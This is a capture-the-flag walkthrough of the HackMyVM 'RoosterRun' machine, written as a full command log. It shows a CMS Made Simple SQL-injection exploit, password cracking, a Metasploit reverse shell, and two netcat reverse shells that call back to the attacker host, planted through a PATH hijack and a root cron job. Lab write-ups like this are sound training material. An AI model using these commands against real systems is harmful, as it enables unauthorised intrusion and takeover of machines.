# CTF Penetration Testing

## HackMyVM

### RoosterRun - Machine

#### Machine Description

- Machine name: [RoosterRun](https://hackmyvm.eu/machines/machine.php?vm=RoosterRun)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/roosterrun.png" alt="RoosterRun Machine Logo" width="150"/>

#### Tools Used

- Burp Suite
- Netcat
- Nmap
- ffuf
- Gobuster
- John the Ripper
- LINpeas
- Metasploit
- pspy
- SearchSploit
- Wfuzz

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:61:61:4b:cf  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 564  bytes 142355 (139.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 551  bytes 57729 (56.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 65858  bytes 4063496 (3.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 66681  bytes 4029029 (3.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1010  bytes 112648 (110.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1010  bytes 112648 (110.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.117
192.168.56.120 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.120`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 10:18 EDT
Nmap scan report for 192.168.56.120
Host is up (0.00089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.57 ((Debian)) ←
MAC Address: 08:00:27:6D:DC:A0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.24 seconds
```

`curl http://192.168.56.120`:
```http
<!doctype html>
<!--[if IE 8]>         <html lang='en' dir='ltr' class='lt-ie9'> <![endif]-->
<!--[if gt IE 8]><!--> <html lang='en' dir='ltr'> <!--<![endif]--><head>
        <meta charset='UTF-8' />
        
<base href="http://192.168.56.120/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2023. All rights reserved." /> ←

[...]
```

`gobuster dir -u http://192.168.56.120 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.120
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,500,400,401
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,html,php,bak,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 318] [--> http://192.168.56.120/modules/]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.56.120/uploads/]
/doc                  (Status: 301) [Size: 314] [--> http://192.168.56.120/doc/]
/admin                (Status: 301) [Size: 316] [--> http://192.168.56.120/admin/] ←
/assets               (Status: 301) [Size: 317] [--> http://192.168.56.120/assets/]
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 19497]
/.html                (Status: 403) [Size: 279]
/lib                  (Status: 301) [Size: 314] [--> http://192.168.56.120/lib/]
/config.php           (Status: 200) [Size: 0]
/tmp                  (Status: 301) [Size: 314] [--> http://192.168.56.120/tmp/]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]

[...]
```

`burpsuite`

`HTTP Request`:
```http
POST /admin/login.php HTTP/1.1 ←
Host: 192.168.56.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://192.168.56.120
Connection: close
Referer: http://192.168.56.120/admin/login.php
Cookie: CMSSESSIDa0ef49a94e6c=24fkdgvrau8ehki0iu3n7cm674
Upgrade-Insecure-Requests: 1

username=admin&password=TEST&loginsubmit=Submit ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Thu, 19 Sep 2024 14:27:51 GMT
Server: Apache/2.4.57 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: a34d1f2f0e6a92dc6019690c0129ed829dd78b64=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; domain=192.168.56.120; HttpOnly
Set-Cookie: _userkey_=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; domain=192.168.56.120; HttpOnly
Set-Cookie: __c=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; domain=192.168.56.120; HttpOnly
Content-Language: en_US
Vary: Accept-Encoding
Content-Length: 4609 ←
Connection: close
Content-Type: text/html; charset=utf-8

<!doctype html>
<html>

[...]

						</fieldset>
					</form>
						<div class="message error">
							User name or password incorrect ←
						</div>

[...]

</html>
```

`wfuzz -u 'http://192.168.56.120/admin/login.php' -d 'username=admin&password=FUZZ&loginsubmit=Submit' -z file,/usr/share/wordlists/rockyou.txt --hh 4609 -t 100 -c -v`:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.120/admin/login.php
Total requests: 14344392

====================================================================================================================================================
ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload                                     
====================================================================================================================================================

[...]
```
❌ Failed Step.

`searchsploit cms made simple`:
```
searchsploit cms made simple 2.2.9
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                   | php/webapps/46635.py ←
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`cp /usr/share/exploitdb/exploits/php/webapps/46635.py ./`

`cat ./46635.py`:
```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9 ←
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print "[+] Specify an url target"
    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

[...]
```

`./46635.py`:
```
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based. ←
```

`./46635.py -u http://192.168.56.120`:
```
[+] Salt for password found: 1a0112229fbd699d
[+] Username found: admin
[+] Email found: admin@localhost.com
[+] Password found: 4f943036486b9ad48890b2efbf7735a8
```

`vim ./admin_hash.txt`:
```
admin:4f943036486b9ad48890b2efbf7735a8$1a0112229fbd699d
```

`hash-identifier`:
```
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 4f943036486b9ad48890b2efbf7735a8 ←

Possible Hashs:
[+] MD5 ←
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
 HASH: 1a0112229fbd699d ←

Possible Hashs:
[+] MySQL
[+] MD5(Middle) ←

Least Possible Hashs:
[+] MD5(Half)
--------------------------------------------------
```

`john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 --format=dynamic_4 ./admin_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic_4 [md5($s.$p) (OSC) 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
homeandaway      (admin) ←
1g 0:00:00:01 DONE (2024-09-19 11:10) 0.7575g/s 15272p/s 15272c/s 15272C/s nokian70..spongy
Use the "--show --format=dynamic_4" options to display all of the cracked passwords reliably
Session completed.
```

`burspsuite`

`HTTP Request`:
```http
POST /admin/login.php HTTP/1.1 ←
Host: 192.168.56.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: http://192.168.56.120
Connection: close
Referer: http://192.168.56.120/admin/login.php
Cookie: CMSSESSIDa0ef49a94e6c=24fkdgvrau8ehki0iu3n7cm674
Upgrade-Insecure-Requests: 1

username=admin&password=homeandaway&loginsubmit=Submit ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Thu, 19 Sep 2024 14:56:18 GMT
Server: Apache/2.4.57 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 23324
Connection: close
Content-Type: text/html; charset=utf-8

<!doctype html>
<html lang="" dir="ltr">

[...]

</html>
```

`msfcosole -q`

`search cmsms`, `use exploit/multi/http/cmsms_object_injection_rce`, `set PAYLOAD php/meterpreter/reverse_tcp`, `show options`, `set RHOSTS 192.168.56.120`, `set USERNAME admin`, `set PASSWORD homeandaway`, `set LHOST 192.168.56.118`, `set LPORT 4444`, `exploit`:
```
[*] Started reverse TCP handler on 192.168.56.118:4444 ←
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (39927 bytes) to 192.168.56.120
[+] Deleted RRRQrdbrI.php
[*] Meterpreter session 1 opened (192.168.56.118:4444 -> 192.168.56.120:42610) at 2024-09-20 03:46:16 -0400 ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`getuid`:
```
Server username: www-data ←
```

`sysinfo`:
```
Computer    : rooSter-Run
OS          : Linux rooSter-Run 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64
Meterpreter : php/linux
```

`ls -alps /home/kali/Desktop/tools`:
```
total 9692
   4 drwxrwxr-x 2 kali kali    4096 Sep 20 04:02 ./
   4 drwxr-xr-x 8 kali kali    4096 Sep 14 10:40 ../
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET2.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET35.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET4.exe
2156 -rw-r--r-- 1 root root 2204117 Sep 10 10:00 Invoke-Mimikatz.ps1
 340 -rw-rw-r-- 1 kali kali  347648 Sep  9 06:17 JuicyPotato.exe
 844 -rwxr-xr-x 1 kali kali  860337 Sep 20 04:02 linpeas.sh ←
  48 -rw-rw-r-- 1 kali kali   48875 Sep 19 12:45 lse.sh ←
  60 -rw-r--r-- 1 root root   59392 Sep  9 13:09 nc.exe
  24 -rw-r--r-- 1 root root   22016 Dec  7  2021 PrintSpoofer32.exe
  28 -rw-r--r-- 1 root root   27136 Dec  7  2021 PrintSpoofer64.exe
2872 -rw-rw-r-- 1 kali kali 2940928 Jan 17  2023 pspy32
3032 -rw-rw-r-- 1 kali kali 3104768 Jan 17  2023 pspy64
  52 -rw-r--r-- 1 root root   51712 May 20  2023 RunasCs.exe
  60 -rw-r--r-- 1 root root   61440 May 17  2023 RunasCs_net2.exe
```

`upload /home/kali/Desktop/tools/lse.sh /tmp`:
```
[*] Uploading  : /home/kali/Desktop/tools/lse.sh -> /tmp/lse.sh
[*] Completed  : /home/kali/Desktop/tools/lse.sh -> /tmp/lse.sh ←
```

`chmod u+x /tmp/lse.sh`

`upload /home/kali/Desktop/tools/pspy64 /tmp`:
```
[*] Uploading  : /home/kali/Desktop/tools/pspy64 -> /tmp/pspy64
[*] Completed  : /home/kali/Desktop/tools/pspy64 -> /tmp/pspy64 ←
```

`chmod u+x /tmp/pspy64`

`shell`

`python3 -c 'import pty;pty.spawn("/bin/bash")';`

`/tmp/lse.sh > /tmp/lse_output.txt`:
```
If you know the current user password, write it here to check sudo privileges:
```

`cat /tmp/lse_output.txt`:
```
[...]

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip             
[i] usr060 Other users..................................................... skip             
[*] usr070 PATH variables defined inside /etc.............................. yes!             
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip             
[!] fst060 Can we write to any setgid binary?.............................. skip             
[*] fst070 Can we read /root?.............................................. nope             
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'www-data' have mail?...................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ yes!
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... yes!
---
drwxrwx---+ 2 root root 4096 Sep 24  2023 /usr/local/bin ←
---
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'www-data'.................................. skip
[i] fst510 SSH files anywhere.............................................. skip             
[i] fst520 Check hosts.equiv file and its contents......................... skip             
[i] fst530 List NFS server shares.......................................... skip             
[i] fst540 Dump fstab file................................................. skip

[...]

========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes! ←
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/anacron:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/anacrontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope             
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip

[...]
```

`/tmp/pspy64 -c -p > /tmp/pspy64_output.txt`

`cat /tmp/pspy64_output.txt`:
```
[...]

2024/09/20 14:53:03 CMD: UID=33    PID=970    | /tmp/pspy64 
2024/09/20 14:53:03 CMD: UID=33    PID=950    | /bin/sh 

[...]

2024/09/20 14:54:01 CMD: UID=0 ←   PID=995    | /bin/bash /opt/maintenance/backup.sh ←
2024/09/20 14:54:01 CMD: UID=1000  PID=996    | bash ← /home/matthieu/StaleFinder  ←
2024/09/20 14:54:01 CMD: UID=0     PID=997    | /bin/bash /opt/maintenance/backup.sh 
2024/09/20 14:54:01 CMD: UID=1000  PID=998    | bash ← /home/matthieu/StaleFinder ←

[...]
```

`cat /home/matthieu/StaleFinder`:
```bash
#!/usr/bin/env bash ←

for file in ~/*; do
    if [[ -f $file ]]; then
        if [[ ! -s $file ]]; then
            echo "$file is empty."
        fi
        
        if [[ $(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```

`getfacl /usr/local/bin`:
```
getfacl: Removing leading '/' from absolute path names
# file: usr/local/bin
# owner: root ←
# group: root ←
user::rwx
user:www-data:rwx ←
user:matthieu:r-x ←
group::---
mask::rwx
other::---
```

`ls -alps /usr/local/bin`:
```
total 8
4 drwxrwx---+  2 root root 4096 Sep 24  2023 ./
4 drwxr-xr-x  10 root root 4096 Jun 15  2023 ../
```

`echo $PATH`:
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ←
```

`which bash`:
```
/usr/bin/bash ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./bash`:
```
#!/usr/bin/bash
nc -c /usr/bin/bash 192.168.56.118 5555
```

`nc -lnvp 5555`:
```
listening on [any] 5555 ... ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`upload /home/kali/bash /usr/local/bin/bash`:
```
[*] Uploading  : /home/kali/bash -> /usr/local/bin/bash
[*] Uploaded -1.00 B of 48.00 B (-2.08%): /home/kali/bash -> /usr/local/bin/bash
[*] Completed  : /home/kali/bash -> /usr/local/bin/bash ←
```

`chmod 777 /usr/local/bin/bash`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.120] 46504 ←
```

![Victim: matthieu](https://img.shields.io/badge/Victim-matthieu-64b5f6?logo=linux&logoColor=white)

`python3 -c 'import pty;pty.spawn("/bin/bash")';`

`whoami`:
```
matthieu ←
```

`cd /home/matthieu`

`cat ./user.txt`:
```
32af3c9a9cb2fb748aef29457d8cff55 ←
```

`nc -lnvp 6666 > /tmp/linpeas.sh`:
```
listening on [any] 6666 ... ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cat /home/kali/Desktop/tools/linpeas.sh | nc 192.168.56.120 6666 -N`

![Victim: matthieu](https://img.shields.io/badge/Victim-matthieu-64b5f6?logo=linux&logoColor=white)

```
connect to [192.168.56.120] from (UNKNOWN) [192.168.56.118] 53652 ←
```

`ls -alps /tmp`:
```
total 1012
  4 drwxrwxrwt  9 root     root       4096 Sep 20 15:41 ./
  4 drwxr-xr-x 18 root     root       4096 Jul 22  2023 ../
  4 drwxrwxrwt  2 root     root       4096 Sep 20 14:38 .font-unix/
  4 drwxrwxrwt  2 root     root       4096 Sep 20 14:38 .ICE-unix/
844 -rwxr-xr-x  1 matthieu matthieu 860337 Sep 20 15:23 linpeas.sh ←

[...]
```

`chmod u+x /tmp/linpeas.sh`

`/tmp/linpeas.sh > /tmp/linpeas_output.txt`

`cat /tmp/linpeas_output.txt`:
```
[...]

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*                                 
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
tcp   LISTEN 0      511                *:80              *:*          
tcp   LISTEN 0      128             [::]:22           [::]:*     

[...]

╔══════════╣ Unexpected in /opt (usually empty) ←
total 12                                                                                     
drwxr-xr-x+  3 root root 4096 Sep 19  2023 .
drwxr-xr-x  18 root root 4096 Jul 22  2023 ..
drwxr-xr-x   4 root root 4096 Sep 24  2023 maintenance ←

[...]
```

`ls -alps /opt/maintenance`:
```
total 20
4 drwxr-xr-x  4 root root 4096 Sep 24  2023 ./
4 drwxr-xr-x+ 3 root root 4096 Sep 19  2023 ../
4 -rwxr-xr-x  1 root root  367 Sep 20  2023 backup.sh ←
4 drwx---rwt  2 root root 4096 Sep 24  2023 pre-prod-tasks/ ←
4 drwx---rwx  2 root root 4096 Sep 24  2023 prod-tasks/ ←
```

`cat /opt/maintenance/backup.sh`:
```bash
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"


for file in "$PREPROD"/*; do
  if [[ -f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[ -f $file && ! -O $file ]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks ←
```

`man run-parts`:
```
[...]

DESCRIPTION
       run-parts runs all the executable files named within constraints described below, found in directory directory.  Other files and directories are silently ignored. ←

[...]
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lvnp 7777`:
```
listening on [any] 7777 ... ←
```

![Victim: matthieu](https://img.shields.io/badge/Victim-matthieu-64b5f6?logo=linux&logoColor=white)

`echo -e '#!/usr/bin/bash\nnc -c /usr/bin/bash 192.168.56.118 7777' > /opt/maintenance/pre-prod-tasks/reverse_shell.sh`

`chmod 777 /opt/maintenance/pre-prod-tasks/reverse_shell.sh`

`cat /opt/maintenance/pre-prod-tasks/reverse_shell.sh`:
```
#!/usr/bin/bash
nc -c /usr/bin/bash 192.168.56.118 7777
```

`ls -alps /opt/maintenance/prod-tasks`:
```
total 12
4 drwx---rwx 2 root root 4096 Sep 20 16:31 ./
4 drwxr-xr-x 4 root root 4096 Sep 24  2023 ../
4 -rwxr-xr-x 1 root root   56 Sep 20 16:31 reverse_shell.sh ←
```

`mv /opt/maintenance/prod-tasks/reverse_shell.sh /opt/maintenance/prod-tasks/reverse_shell`

`ls -alps /opt/maintenance/prod-tasks`:
```
total 12
4 drwx---rwx 2 root root 4096 Sep 20 16:31 ./
4 drwxr-xr-x 4 root root 4096 Sep 24  2023 ../
4 -rwxr-xr-x 1 root root   56 Sep 20 16:31 reverse_shell ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.120] 34416 ←
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`cd /root`

`ls -alps`:
```
total 40
4 drwx------  5 root root 4096 Sep 19 16:18 ./
4 drwxr-xr-x 18 root root 4096 Jul 22  2023 ../
0 lrwxrwxrwx  1 root root    9 Jun 15  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root 3526 Sep 24  2023 .bashrc
4 drwxr-xr-x  3 root root 4096 Sep 24  2023 .local/
4 drwxr-xr-x 12 root root 4096 Jul 22  2023 .oh-my-zsh/
4 -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4 -rw-r--r--  1 root root   33 Sep 24  2023 root.txt ←
4 -rw-r--r--  1 root root   66 Sep 24  2023 .selected_editor
4 drwx------  2 root root 4096 Jun 15  2023 .ssh/
4 -rw-r--r--  1 root root 3915 Sep 22  2023 .zshrc
```

`cat root.txt`:
```
670ff72e9d8099ac39c74c080348ec17 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
